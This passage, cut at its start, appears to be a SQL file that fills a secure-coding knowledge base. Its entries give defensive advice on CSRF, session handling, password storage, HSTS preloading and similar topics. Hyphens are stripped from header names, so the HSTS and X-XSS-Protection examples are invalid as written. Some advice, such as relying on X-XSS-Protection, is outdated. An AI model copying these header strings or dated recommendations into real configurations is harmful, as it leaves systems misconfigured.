Third, Whenever there are authenticated users with different roles/privileges you should enforce restrictions on the server side upon your form submits/processing in order to prevent privilege escalation. You should apply the principle of least privilege in order to ensure a higher level of security.
Fourth, Whenever the application is sending sensitive data through the form submit this data must always be sent through a POST variable instead of a GET since a GET will leak this data through the URL by example the referrer header.

', 'Submit forms pattern'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('54',' Description:

The use of a crossdomain.xml file is required when the web application uses Flash.
This file is used to set up restrictions for any other web servers using the
flash application. If these are not set correctly, an attacker could exploit this to
execute targeted attacks against the users of the web application.

 Solution:

Always make sure the crossdomain.xml only contains trusted domains.
', 'The crossdomain xml should only contains trusted domains'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('131',' Description:

There are some kind of headers that uses tokens such as Bearer or JWT which are signed or calculated using a key, by the server that creates it.

 Solution:

Verify the integrity and authenticity of the HTTP headers added by a trusted proxy or SSO devices by checking the digital signature or by recalculating the hash or integrity method using a private key or passphrase.
', 'HTTP headers added by a frontend'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('80',' Description:

Authentication should always be performed at a central location in the application, in
order to prevent missing authentication on certain levels in the application.

 Solution:

Use a central location for authentication. If u want to put extra constraints on the
users for accessing critical parts of your application, you have to implement
stepup or adaptive authentication mechanisms.

Verify that alternative and less secure access paths do not exist.
', 'Authentication at a central location'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('200',' Description:

When an application don''t use signed components an attacker can easily modify parts
of the application and load inject a backdoors. Also the attacker could
modify business logic in the application without notice. Signed application
components can help harden your application and make it noticeable when an attacker tries to
modify the code.

 Solution:

Create for the different components in the application signed signatures and verify these in
the application at starting of the application and at runtime level.
', 'Signed application components'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('169',' Description:

HTTP StrictTransportSecurity (HSTS) allows sites to specify that they should be accessed
via a secure connection only. The problem is, a user''s first request to a site employing
HSTS may not be over HTTPS. A preload list will allow us to ship Firefox with some
preset HSTS sites that, from the first time they''re accessed in the browser, will require
a secure connection.

 Solution:

In order to be included on the HSTS preload list, your site must:

1. Have a valid certificate (which must expire before 2016 if it uses SHA1).
2. Redirect all HTTP traffic to HTTPS—i.e. be HTTPS only.
3. Serve all subdomains over HTTPS, specifically including the www subdomain if a DNS
record for that subdomain exists.
4. Serve an HSTS header on the base domain:
* Expiry must be at least eighteen weeks (10886400 seconds).
* The includeSubdomains token must be specified.
* The preload token must be specified.
* If you are serving a redirect, that redirect must have the HSTS header, not the page it
  redirects to.

For more details on HSTS, please see RFC 6797. Note that the preload flag in the HSTS
header is required to confirm and authenticate your submission to the preload list.
An example valid HSTS header:

    StrictTransportSecurity: maxage=10886400; includeSubDomains; preload

Adding your website to the list:
https://www.chromium.org/hsts     


Source:
https://wiki.mozilla.org/Privacy/Features/HSTS_Preload_List
', 'HSTS preload'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('999',' Description:

This item is currently not available.



 Solution:

This item is currently not available.
', 'not available item'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('254',' Description:

Whenever a user changes his password, the user should be granted the option
to kill all other concurrent sessions. This countermessure helps to exclude
potential attackers living on a hijacked session.

Note: Whenever users are granted the possibility to change their passwords,
      do not forget to make them reauthenticate or to use a form of step up
      or adaptive authentication mechanism.

 Solution:

Verify the user is prompted with the option to terminate all other active sessions 
after a successful change password process.
', 'Password change leads to destroying concurrent sessions'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('14',' Description:

Whenever a programmer decides to use third party software,
he should keep an eye implementing a proper version management methodology for this software.
When hackers discover vulnerabilities they often publish these exploits online in order
to push the developers of this software to fix their issues. As a result,
when your software is not upgraded to the latest available version,
script kiddies could easily compromise your application by following the
exploit tutorials online, thus compromising your application.

 Solution:

One option is not to use components that you did not write.
But that is not very realistic.

Most component projects do not create vulnerability patches for old versions.
Instead, most simply fix the problem in the next version. So upgrading to these new
versions is critical.
Software projects should have a process in place to:

Identify all components and the versions you are using, including all dependencies.
(e.g., the versions plugin).

Monitor the security of these components in public databases,
project mailing lists, and security mailing lists, and keep them up to date.

Establish security policies governing components use, such as requiring certain software
development practices, passing security tests, and acceptable licenses.

Where appropriate, consider adding security wrappers around components to disable unused
functionality and/ or secure weak or vulnerable aspects of the component.

This also goes for all other components that should be up to date with proper security
configuration(s) and version(s) such as server OS etc.

This should include removal of unneeded configurations and folders such as sample
applications, platform documentation, and default or example users.
', 'Version management'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('55',' Description:

Whenever session IDs are not generated with a sufficient entropy this could lead to a
session collision or session hijacking. If an attacker can guess an authenticated user''s
session identifier, he can take over the user''s session.

 Solution:

The WebLogic deployment descriptor should specify a session identifier length of at
least 128 bits. A shorter session identifier leaves the application open to
bruteforce session guessing attacks.
', 'Session ids should be generated with sufficient entropy'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('229',' Description:

Security logs should never allow unauthorized/unauthenticated access because these files include
a lot of sensitive information and could assist an attacker in leveraging attacks. Whenever
these logs can be accessed and modified, attackers could also erase their presence and attack
trail they made to the application.

 Solution:

The security logs could be protected by means of (HIDS).
This is a system that monitors important operating system files to make sure the files can only
be accessed by particular users. Security log files could also be protected by the OS itself by
defining groups and users and grant only a particular set of users access to the files.
', 'Unauthorized and unauthenticated access security logs'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('7',' Description:

Web applications heavily use databases to store and access the data they need for their
operations. Historically, relational databases have been by far the most common
technology for data storage, but in the last years, we are witnessing an increasing
popularity for databases that organise data using the XML language.
Just like relational databases are accessed via SQL language, XML databases use XPath as
their standard query language.

 Solution:

Just like the techniques to avoid SQL injection, you need to use a parameterised XPath
interface if one is available, or escape the user input to make it safe to include in a
dynamically constructed query. If you are using quotes to terminate untrusted input in a
dynamically constructed XPath query, then you need to escape that quote in the untrusted
input to ensure the untrusted data can not try to break
out of that quoted context.
', 'X Path injections'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('56',' Description:

Whenever user generated session IDs are not rejected by the server,
an attacker could change the session credentials given by the server on the targets
computer into an easy to remember value.

The attacker then changes his own session credentials with the easily to remember
value he used on the target''s computer. Through this,  the attacker could do a session hijacking
on the targets current session.

 Solution:

All session IDs not generated by the server should be rejected.
', 'User generated session ids should be rejected by the server'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('137',' Description:

Always use checksums when working with interpreted code, libraries, executables,
and configuration files, when these checksums do not match you can determine that
these files are corrupted or backdoored.

 Solution:

Verify that the integrity of interpreted code, libraries, executables, and configuration
files is verified using checksums or hashes (not MD5).
', 'Verify integrity using checksums'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('21',' Description:

This header enables the Crosssite scripting (XSS) filter built into most recent
web browsers. It is usually enabled by default anyway, so the role of this header is to reenable the filter for this particular website if it was disabled by the user. This header is supported in IE 8 and in Chrome 4.

 Solution:

These headers are also known as the: XXSSProtection: 1; mode=block and provide protection against XSS attacks when implemented in the application or webserver.

NOTE:
This header only protects against some reflected XSS attacks. This is no substitute for normal escaping and input filtering and sanitization.
', 'Include X XSS'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('151',' Description:

When you process data you should always enforce policies for the transfer of sensitive data in order to enforce a higher level of security imposing structured thresholds to fend off attackers.

 Solution:

First, you have to create a list which contains locations of where all sensitive data is used and processed. Next, you create a policy that tells who is allowed and to what extent they have privileges to look into which data. When this data moves through the network it should always be encrypted (TLS) and also be stored encrypted. Thereafter you should establish monitoring and testing methods to verify that everything stays encrypted and your policies are properly enforced.
Also, determine whenever data storage is necessary or becomes a redundancy. Whenever sensitive data does not have to be stored don''t store it. This reduces the quantity of data may your application ever be compromised.
Ultimately, verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required.
Sensitive data or primary keys, such as personally identifiable information or credit cards should also be anonymized, masked or truncated on the server before transmission to the client.

', 'Enforce policys for sensitive data processing'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('96',' Description:

Input validation refers to the process of validating all the input to an application
before using it. Input validation is absolutely critical to application security,
and most application risks involve tainted input at some level.

 Solution:

Verify that a single input validation control is used by the application for each
type of data that is accepted. This way your validation controls stay clear, transparent
and manageable. This method leaves less room for error.

', 'Single input validation controls'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('119',' Description:

The National Institute of Standards and Technology (NIST) issued the FIPS 140 Publication
Series to coordinate the requirements and standards for cryptography modules that include
both hardware and software components. Protection of a cryptographic module within a
security system is necessary to maintain the confidentiality and integrity of the
information protected by the module.

 Solution:

Verify that cryptographic modules used by the application have been validated against
FIPS 1402 or an equivalent standard.
', 'Validated cryptographic modules'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('224',' Description:

CrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,
email, blog, instant message, or program causes a users Web browser to perform an unwanted
action on a trusted site for which the user is currently authenticated.

The impact of a successful crosssite request forgery attack is limited to the
capabilities exposed by the vulnerable application. For example, this attack could result
in a transfer of funds, changing a password, or purchasing an item in the users context.
In effect, CSRF attacks are used by an attacker to make a target system perform a
function (funds Transfer, form submission etc.) via the targets browser without
knowledge of the target user at least until the unauthorized function has been committed.

 Solution:

REST (REpresentational State Transfer) is a simple stateless architecture that generally runs
over HTTPS/TLS. The REST style emphasizes that interactions between clients and services are
enhanced by having a limited number of operations

Since the architecture is stateless, the application should make use of sessions or cookies to
store the HTTP sessions, which allow associating information with individual visitors. The preferred method for REST
services is to utilize tokens for interactive information interchange between the user and the server. 

By sending this information solely by means of headers, the application is no longer susceptible to CSRF attacks
since the CSRF attack utilizes the browsers cookie jar for succesful attacks.
', 'CSRF on REST'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('110',' Description:

Whenever a functionality consists out of following several steps to achieve some goal i.e,

User adds items to chart > User enters shipping information > User pays for goods > Items will be shipped.
You want to make sure the user can not skip the payment step in order to receive his goods.

 Solution:

In order to verify that this stage was run through by a sincere user you want to enforce
the application to only process business logic flows in sequential step order, with all
steps being processed in realistic human time, and not process out of order, skipped steps,
processed steps from another user, or too quickly submitted transactions.

', 'Enforce sequential step order'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('132',' Description:

The ability to restrict and maintain user actions within unique sessions is critical to
web security. Most users of this guide will be using an application framework with built
in session management capabilities. Others will use languages such as Perl CGI that do not.
Those without a built in session management system and those who override the existing
session management systems are at an immediate disadvantage. Implementations built from
scratch are often weak and breakable. Developers are strongly discouraged from
implementing their own Session Management.

 Solution:

Always use the frameworks default session management control implementation in your application. 
If not possible you should find hardened guides in how to accomplish this in a secure manner.
', 'Session management control'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('172',' Description:

STRIDE is a collective for a series of vulnerabilities your applications should
cover in order to harden your applications security.

STRIDE stands for:
Spoofing
Tampering
Repudiation
Information Disclosure
Elevation of privilege

 Solution:

The STRIDE was initially created as part of the process of threat modelling. STRIDE is a model of threats, used to help reason and find threats to a system. It is used in conjunction with a model of the target system that can be constructed in parallel. This includes a full breakdown of processes, data stores, data flows and trust boundaries.

Today it is often used by security experts to help answer the question "what can go wrong in this system we''re working on?"
', 'STRIDE'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('198',' Description:

When you have an offline PKI setup you need to have solid strong crypto layers.
An attacker will look for weak chains in the hierarchy and abuse them when found.
This can lead to ManInTheMiddle (MITM) attacks and impact the 3 security pillars C.I.A (Confidentiality, Integrity and Availability).

 Solution:

Verify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy,
including root and intermediary certificates of your selected certifying authority.
Because this is always in flux we

recommend using the:
SSLlabs free test https://www.ssllabs.com/ssltest/
OWASP OSAFT : https://www.owasp.org/index.php/OSaft

These TLS hardening recommendations can then be applied on all servers.
', 'Strong CRYPTO through CA hierachy'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('109',' Description:

Attackers with low access rights wil always try to elevate their privileges in order to get more sensitive information/functionalities at their disposal. This can be achieved by for example:

  Functions that fail to check authorization
  Compromised functions/services that run with higher privileges
  Compromised user accounts with higher privileges

These examples just scratch the surface of what attackers will try in order to elevate their privilages on your application/system. Therefore it is very important to take this reccomendation high into account.

 Solution:

Checking if a user has enough authorization to execute certain request should always be enforced on the serverside. Also, you may apply the Principle of Least privilege, the principle of least privilege recommends that accounts have the least amount of privilege required to perform their business processes. This encompasses user rights, resource permissions such as CPU limits, memory, network, and file system permissions. For example, if a user only requires access to the network, read access to a database table, and the ability to write to a log, this describes all the permissions that should be granted. Under no circumstances should the user be granted administrative privileges. 
', 'Privilege escalation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('70',' Description:

Whenever an application generates an error like:

"This username already exists"

An attacker could enumerate these usernames, enlarging his chance for a successful
bruteforce attack. Same goes for "Password forget" functions.

Whenever an user forgets his password, make him fill in his email address
rather than an username.

 Solution:

All error messages should be generalized in order to prevent username enumeration.
Also sometimes you cannot avoid information leaking in functionalities such as a
registration page. Here you need to use tarpitting methods to prevent an automated
attack by an attacker.

', 'Username enumeration'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('108',' Description:

Validation of user supplied input must always be enforced on the server side.
Whenever validation of the input is being perfomed on the client side then
the constraints can easilly be bypassed whenever an attacker uses an intercepting proxy
which he can use to tamper data after they have been validated and send to the server. 

Or the attacker can simply change the constraint on the client side in his browser to bypass the 
constraints.

 Solution:

All validation of input should be handled on the server side. Whenever the validation is handled on 
the server side, the validation logic is outside of the scope of the attacker and he can not influence
the results.

Note: Validation of input should never be done with a blacklisting aproach since attackers can be very
nifty in bypassing these type of constraints. Always perform white list validation checks preferably in
combination on type checking. i.e if the application expects the value to be an integer, do not make
the application accept a value of a string. This input should be logged and rejected.
', 'Server side validation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('113',' Description:

Passwords should never be stored plaintext or in a reversible format on the application. Whenever an attacker hacks 
into the applications SQL database the passwords are directly compromised. In the case of
prefilled forms in the application, an attacker could also hijack the credentials by badly
configured CORS rules or XSS attacks.

 Solution: 

Verify that forms containing credentials are not filled in by
the application. Prefilling by the application implies that
credentials are stored in plaintext or a reversible format,
which is explicitly prohibited. Passwords should be stored by preferably PBKDF functions.

PBKDF2 uses a pseudorandom function and a configurable number of iterations to derive a
cryptographic key from a password. Because this process is difficult to reverse
(similar to a cryptographic hash function) but can also be configured to be slow to 
compute, key derivation functions are ideally suited for password hashing use cases.

Examples of good ways to store passwords are with, BCRYPT, Blowfish or in some cases SCRYPT
which is a little harder to implement correctly

NOTE: Password prefilling also happens when using the browsers password manager. However this process is different fromt he context described above since the description above implies an application that prefilles credentials from the database/localstorage/etc.
', 'Prevent password pre filling'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('235',' Description:

Whenever sensitive data is accessed by a user this event should be logged to later verify
the integrity of the access to the data. The same principle applies to whenever the data is collected
and under which protection directives the data is accessed to.

Example:
Imagine an insurance company and an accident has happened that is being showed on the news. 
Workers of that insurance company must not be able to randomly fill in license plates 
they see on the news to find PI about the people having the accident if it is not related
to their jobs. I.E, an insurance holder calls the company to file in an accident report. 

 Solution:

Verify accessing sensitive data is logged, if the data is collected 
under relevant data protection directives or where logging of accesses is required.
', 'Logging guidelines to access sensitive information'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('249',' Description:

All authenticated data should be removed from the browsers storage as soon as
the session is terminated. This reduces the possibility that a potential attacker gains
sensitive authenticated information whenever the application is attacked.

This approach also is necessary to disable unauthenticated users to access the information
if the user was initially logged in on a public computer.

 Solution:

Whenever the user terminates his session all sensitive authenticated information should be 
cleared from the browser in the client storage. such as:

* local storage
* Session storage
* web SQL
* Cache storage
* Application cache
* etc
', 'authenticated data cleared from client storage'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('111',' Description:

Whenever a user browses a section of a webbased application that contains sensitive information the user should be challenged authenticate again using a higher assurance credential to be granted access to this information.
This is to prevent attackers from reading sensitive information after they successfully hijacked a user account.


 Solution:

Verify the application has additional authorization (such as step up or adaptive authentication) so the user is challenged before being granted access to sensitive information. This rule also applies for making critical changes to an account or action.
Segregation of duties should be applied for highvalue applications to enforce antifraud controls as per the risk of application and past fraud.

', 'step up or adaptive authentication'); 
